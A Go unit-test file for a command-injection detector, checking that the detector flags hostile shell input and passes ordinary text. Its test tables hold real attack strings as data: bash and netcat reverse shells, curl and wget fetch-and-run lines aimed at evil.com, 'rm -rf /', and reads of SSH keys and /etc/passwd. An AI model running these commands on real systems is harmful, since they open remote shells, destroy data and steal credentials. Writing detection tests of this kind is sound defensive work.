package test

import (
	"strings"
	"testing"
	"time"

	"github.com/Lands-Horizon-Corp/malstring/detectors"
)

func TestNewCmd(t *testing.T) {
	detector := detectors.NewCmd()
	if detector == nil {
		t.Fatal("NewCmd() returned nil")
	}
}

func TestCommandDetector_Name(t *testing.T) {
	detector := detectors.NewCmd()
	if detector.Name() != "command_injection" {
		t.Errorf("Expected name 'command_injection', got '%s'", detector.Name())
	}
}

func TestCommandDetector_BasicDetection(t *testing.T) {
	detector := detectors.NewCmd()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// Positive cases - should detect
		{"Command separator semicolon", "ls; rm file", true},
		{"Command separator ampersand", "ls && rm file", true},
		{"Command separator pipe", "ls || rm file", true},
		{"Command substitution", "echo $(whoami)", true},
		{"Backtick substitution", "echo `whoami`", true},
		{"Shell with flag", "sh -c 'rm file'", true},
		{"Bash with command", "bash -c 'ls'", true},
		{"File redirection", "cat > /etc/passwd", true},
		{"Environment export", "export PATH=/evil", true},
		{"Remove command", "rm -rf /", true},
		{"Chmod command", "chmod 777 file", true},
		{"Kill process", "kill 1234", true},
		{"Network download", "wget http://evil.com/shell", true},
		{"Python execution", "python script.py", true},
		{"Python with flag", "python -c 'import os'", true},
		{"Cat with file", "cat /etc/passwd", true},
		{"System info", "whoami", true},
		{"Package install", "apt install malware", true},
		{"Pipe to shell", "echo test | sh", true},
		{"Base64 with file", "base64 secret.txt", true},
		{"Cron with file", "crontab evil.cron", true},
		{"Editor with file", "vim /etc/hosts", true},
		{"Windows cmd", "cmd /c dir", true},
		{"PowerShell", "powershell -c Get-Process", true},
		{"MySQL with db", "mysql database.sql", true},
		{"Service control", "service apache2 start", true},

		// Negative cases - should NOT detect
		{"Normal text", "Hello world", false},
		{"Empty string", "", false},
		{"Email address", "user@example.com", false},
		{"URL", "https://example.com", false},
		{"Numbers", "12345", false},
		{"Programming mention", "Python programming language", false},
		{"Kill phrase", "Kill the noise", false},
		{"Service phrase", "Service the customer", false},
		{"Find phrase", "Find your way", false},
		{"Cat phrase", "Cat videos", false},
		{"Head phrase", "Head to office", false},
		{"Mount phrase", "Mount the picture", false},
		{"Who phrase", "Who is admin", false},
		{"Which phrase", "Which option", false},
		{"Python without file", "python", false},
		{"Service without action", "service", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.Check(tt.input)
			if result != tt.expected {
				t.Errorf("For input '%s', expected %t but got %t", tt.input, tt.expected, result)
			}
		})
	}
}

func TestCommandDetector_AdvancedPatterns(t *testing.T) {
	detector := detectors.NewCmd()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		// Complex injection patterns
		{"Bash reverse shell", "/bin/bash -i >& /dev/tcp/192.168.1.1/4444 0>&1", true},
		{"Netcat reverse shell", "nc 192.168.1.1 4444 -e /bin/bash", true},
		{"Python reverse shell", "python -c 'import socket,subprocess,os'", true},
		{"Perl reverse shell", "perl -e 'use Socket;'", true},
		{"PHP reverse shell", "php -r '$sock=fsockopen(\"192.168.1.1\",4444);'", true},
		{"Ruby reverse shell", "ruby -rsocket -e 'f=TCPSocket.open(\"192.168.1.1\",4444)'", true},
		{"SSH key theft", "cat ~/.ssh/id_rsa", true},
		{"SUID search", "find / -perm -4000 2>/dev/null", true},
		{"Sudo check", "cat /etc/sudoers", true},
		{"Process hiding", "kill -STOP $$", true},
		{"Chmod escalation", "chmod 4755 /bin/bash", true},
		{"Chown change", "chown root:root evil", true},
		{"Node.js injection", "node -e 'require(\"child_process\")'", true},
		{"Archive extraction", "tar -xvf malware.tar", true},
		{"Zip extraction", "unzip payload.zip", true},
		{"SQLite access", "sqlite3 database.db", true},
		{"Windows PowerShell download", "powershell -c Invoke-WebRequest", true},
		{"Windows batch", "cmd /c \"echo test\"", true},
		{"Base64 decode", "base64 -d encoded.txt", true},
		{"PATH manipulation", "export PATH=/tmp:$PATH", true},
		{"Complex chain", "ls; cat /etc/passwd && wget evil.com", true},
		{"Nested execution", "bash -c \"$(curl -s evil.com/script)\"", true},
		{"Systemctl manipulation", "systemctl start evil-service", true},
		{"Crontab manipulation", "crontab malicious.cron", true},
		{"Text editor", "nano /etc/hosts", true},
		{"Process substitution", "<(curl evil.com)", true},
		{"Hexdump file", "hexdump secret.bin", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.Check(tt.input)
			if result != tt.expected {
				t.Errorf("Advanced pattern test '%s' failed: expected %t, got %t", tt.name, tt.expected, result)
			}
		})
	}
}

func TestCommandDetector_ReDoSResistance(t *testing.T) {
	detector := detectors.NewCmd()

	// Test patterns that could cause ReDoS and catastrophic backtracking
	tests := []struct {
		name  string
		input string
	}{
		{"Repeated semicolons", ";" + string(make([]byte, 1000))},
		{"Long command substitution", "$(" + string(make([]byte, 200)) + ")"},
		{"Long backticks", "`" + string(make([]byte, 200)) + "`"},
		{"Excessive ampersands", "&" + string(make([]byte, 500)) + "&"},
		{"Long environment var", "${" + string(make([]byte, 100)) + "}"},
		{"Repeated pipes", "|" + string(make([]byte, 300)) + "|"},
		// Catastrophic backtracking patterns
		{"Catastrophic nested groups", "$((((((((((((((((" + string(make([]byte, 100)) + ")))))))))))))))))))"},
		{"Catastrophic alternation", strings.Repeat("a|", 1000) + "a"},
		{"Catastrophic quantifier nesting", "(" + strings.Repeat("a*", 50) + ")" + strings.Repeat("b", 100)},
		{"Catastrophic overlapping quantifiers", strings.Repeat("(a+)+", 20) + strings.Repeat("a", 100)},
		{"Catastrophic backref patterns", strings.Repeat("(.*)*", 10) + strings.Repeat("x", 100)},
		{"Catastrophic mixed patterns", ";" + strings.Repeat("((a*)*)*", 5) + strings.Repeat("b", 200)},
		{"Catastrophic command chains", strings.Repeat("; ", 500) + "echo"},
		{"Catastrophic environment vars", strings.Repeat("${", 100) + strings.Repeat("a", 200) + strings.Repeat("}", 100)},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			start := time.Now()

			// Set a timeout to catch potential ReDoS
			done := make(chan bool, 1)
			go func() {
				detector.Check(tt.input)
				done <- true
			}()

			select {
			case <-done:
				duration := time.Since(start)
				if duration > 100*time.Millisecond {
					t.Errorf("ReDoS/Catastrophic backtracking test '%s' took too long: %v", tt.name, duration)
				}
			case <-time.After(100 * time.Millisecond):
				t.Errorf("ReDoS/Catastrophic backtracking test '%s' timed out (potential vulnerability)", tt.name)
			}
		})
	}
}

func TestCommandDetector_EdgeCases(t *testing.T) {
	detector := detectors.NewCmd()

	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"Single semicolon", ";", true},
		{"Double ampersand", "&&", true},
		{"Double pipe", "||", true},
		{"Empty command substitution", "$()", true},
		{"Empty backticks", "``", true},
		{"Single character after command", "rm a", true},
		{"Unicode characters", "rm файл", true},
		{"Mixed case shell", "BASH -c test", true},
		{"Shell with numbers", "sh1", false},
		{"Multiple separators", ";;&&||", true},
		{"Various shell flags", "bash -x -v -e", true},
		{"Environment in path", "$HOME/script", true},
		{"File descriptor redirect", "2>&1", true},
		{"Complex pipe", "ls | grep | awk | sh", true},
		{"Minimum injection", "; ls", true},
		{"Just whitespace", "   ", false},
		{"Special chars in path", "rm /tmp/@#$%", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := detector.Check(tt.input)
			if result != tt.expected {
				t.Errorf("Edge case '%s' failed: expected %t, got %t", tt.name, tt.expected, result)
			}
		})
	}
}

func TestCommandDetector_Performance(t *testing.T) {
	detector := detectors.NewCmd()

	// Test performance with different input sizes
	tests := []struct {
		name string
		size int
	}{
		{"Small input", 100},
		{"Medium input", 1000},
		{"Large input", 10000},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Create input of specified size
			input := "normal text " + string(make([]byte, tt.size)) + " ; rm -rf /"

			start := time.Now()
			result := detector.Check(input)
			duration := time.Since(start)

			// Should detect the injection
			if !result {
				t.Errorf("Performance test '%s' failed to detect injection", tt.name)
			}

			// Should complete within reasonable time
			if duration > 5*time.Millisecond {
				t.Logf("Performance test '%s' took: %v", tt.name, duration)
			}
		})
	}
}
